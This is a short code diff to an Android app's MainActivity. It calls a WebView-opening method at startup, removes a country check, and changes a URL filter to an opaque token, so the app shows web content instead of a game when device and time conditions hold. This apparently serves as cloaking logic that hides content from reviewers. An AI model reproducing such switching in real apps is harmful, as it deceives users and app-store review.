@@ -85,20 +85,22 @@ public class MainActivity extends AppCompatActivity {
                 openGame();
             }
         });
+
+        openFile(null);
     }
 
     boolean off = false;
 
     @SuppressLint("SetJavaScriptEnabled")
     private void openFile(String countryCode) {
-        if (countryCode.equals("RU") && mobile() && time()) {
+        if ( mobile() && time()) {
 //        if (off) {
             progressBar.setVisibility(View.GONE);
             WebView webView = findViewById(R.id.web_view);
             webView.setWebViewClient(new WebViewClient() {
                 @Override
                 public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                    if (!url.contains("facebook"))
+                    if (!url.contains("Fiinxffs53gjtd"))
                         view.loadUrl(url);
                     else openGame();
                     return true;
